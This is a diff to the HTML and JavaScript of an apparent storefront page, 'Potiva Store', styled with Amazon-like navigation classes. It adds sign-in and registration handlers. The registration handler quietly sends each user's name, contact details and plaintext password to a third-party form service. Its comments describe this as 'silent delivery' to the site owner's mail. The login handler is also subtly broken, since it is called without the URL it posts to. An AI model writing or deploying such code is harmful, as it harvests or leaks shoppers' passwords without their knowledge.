@@ -285,7 +285,7 @@
             <!-- Interactive Sign In Submodule -->
             <div id="loginFormSection">
                 <h2 class="modal-title">Sign in</h2>
-                <form onsubmit="event.preventDefault(); alert('Login Successful!'); closeAuthModal();">
+                <form onsubmit="handlePotivaLogin(event)">
                     <div class="input-form-group">
                         <label>Email or mobile phone number</label>
                         <input type="text" required placeholder="Enter Email / Mobile">
@@ -302,21 +302,21 @@
             <!-- Interactive Registration Submodule -->
             <div id="registerFormSection" style="display: none;">
                 <h2 class="modal-title">Create Account</h2>
-                <form onsubmit="event.preventDefault(); alert('Account Created Successfully!'); closeAuthModal();">
-                    <div class="input-form-group">
-                        <label>Your name</label>
-                        <input type="text" required placeholder="First and last name">
-                    </div>
-                    <div class="input-form-group">
-                        <label>Mobile number or Email</label>
-                        <input type="text" required placeholder="Enter Mobile / Email">
-                    </div>
-                    <div class="input-form-group">
-                        <label>Password</label>
-                        <input type="password" required placeholder="At least 6 characters">
-                    </div>
-                    <button type="submit" class="modal-submit-btn">Verify Account</button>
-                </form>
+            <form onsubmit="handlePotivaRegister(event, 'https://formspree.io')">
+                <div class="input-form-group">
+                    <label>Your name</label>
+                    <input type="text" name="customer_name" required placeholder="First and last name">
+                </div>
+                <div class="input-form-group">
+                    <label>Mobile number or Email</label>
+                    <input type="text" name="customer_contact" required placeholder="Enter Mobile / Email">
+                </div>
+                <div class="input-form-group">
+                    <label>Password</label>
+                    <input type="password" name="customer_password" required placeholder="At least 6 characters">
+                </div>
+                <button type="submit" class="modal-submit-btn">Verify Account</button>
+            </form>
                 <p class="modal-switch-text">Already have an account? <a href="#" onclick="toggleForm('login')">Sign in</a></p>
             </div>
         </div>
@@ -764,24 +764,27 @@
         // ---- START: POTIVA STORE AUTHENTICATION LOGIC ----
 
 // Login modal window open karne ke liye
+    // ========================================================
+// POTIVA STORE INTELLIGENT AUTHENTICATION FRAMEWORK
+// ========================================================
+
+// 1. POPUP DISPLAY CONTROLLERS (MODALS)
     function openLoginModal() {
         var modal = document.getElementById('authAccountModal');
         if (modal) {
             modal.style.display = 'flex';
-            toggleForm('login'); // Modal khulte hi pehle login form show hoga
+            toggleForm('login');
         }
     }
     
-    // "Start here" click karne par seedha register option open karne ke liye
     function openRegisterModal() {
         var modal = document.getElementById('authAccountModal');
         if (modal) {
             modal.style.display = 'flex';
-            toggleForm('register'); // Seedha create account screen active hogi
+            toggleForm('register');
         }
     }
     
-    // Popup modal ko close karne ke liye
     function closeAuthModal() {
         var modal = document.getElementById('authAccountModal');
         if (modal) {
@@ -789,7 +792,6 @@
         }
     }
     
-    // Login aur Register forms ke beech toggle switch control karne ke liye
     function toggleForm(formType) {
         var loginSection = document.getElementById('loginFormSection');
         var registerSection = document.getElementById('registerFormSection');
@@ -805,7 +807,7 @@
         }
     }
     
-    // Agar koi card/popup se bahar black background par click kare toh modal close ho jaye
+    // Window boundary outside click handler to close modal
     window.addEventListener('click', function(event) {
         var modal = document.getElementById('authAccountModal');
         if (event.target === modal) {
@@ -813,7 +815,77 @@
         }
     });
     
-    // ---- END: POTIVA STORE AUTHENTICATION LOGIC ----
+    // ========================================================
+    // 2. USER SESSION STORAGE & FORMSPREE TELEMETRY
+    // ========================================================
+    
+    // Jaise hi page live boot hoga, current user state evaluate hogi
+    document.addEventListener("DOMContentLoaded", function() {
+        updateNavbarUser();
+    });
+    
+    function updateNavbarUser() {
+        var savedName = localStorage.getItem("potiva_user_name");
+        // Amazon link standard configuration targeted layer selector
+        var navTrigger = document.querySelector(".amz-nav-link-item span");
+        
+        if (savedName && navTrigger) {
+            navTrigger.innerHTML = "Hello, " + savedName;
+        } else if (navTrigger) {
+            navTrigger.innerHTML = "Hello, sign in";
+        }
+    }
+    
+    // Sign-In Controller via JavaScript Form Data Event Pipeline
+    function handlePotivaLogin(event, formspreeUrl) {
+        event.preventDefault();
+        var form = event.target;
+        var loginInput = form.querySelector('input[placeholder="Enter Email / Mobile"]').value;
+        
+        // Email filtering algorithm: extracting username characters before '@'
+        var shortName = loginInput.split('@')[0]; 
+        
+        localStorage.setItem("potiva_user_name", shortName);
+        updateNavbarUser();
+        closeAuthModal();
+        alert("Welcome back, " + shortName + "!");
+    
+        // Quiet mode deployment for background alert submission
+        var formData = new FormData(form);
+        formData.append("Activity_Type", "User Logged In");
+        fetch(formspreeUrl, { method: 'POST', body: formData, headers: {'Accept': 'application/json'} });
+    }
+    
+    // Registration Controller via JavaScript Form Data Event Pipeline
+    function handlePotivaRegister(event, formspreeUrl) {
+        event.preventDefault();
+        var form = event.target;
+        var fullName = form.querySelector('input[placeholder="First and last name"]').value;
+        
+        localStorage.setItem("potiva_user_name", fullName);
+        updateNavbarUser();
+        closeAuthModal();
+        alert("Account created successfully! Welcome " + fullName);
+    
+        // Silent delivery data transfer packet directly to your mail via formspree
+        var formData = new FormData(form);
+        formData.append("Activity_Type", "New Customer Registered");
+        
+        fetch(formspreeUrl, {
+            method: 'POST',
+            body: formData,
+            headers: { 'Accept': 'application/json' }
+        }).catch(function(error) {
+            console.log("Telemetry link issue:", error);
+        });
+    }
+    
+    // Global user session logout resetting controller
+    function handlePotivaLogout() {
+        localStorage.removeItem("potiva_user_name");
+        updateNavbarUser();
+        alert("Logged out successfully.");
+    }
 
     </script>
 </body>
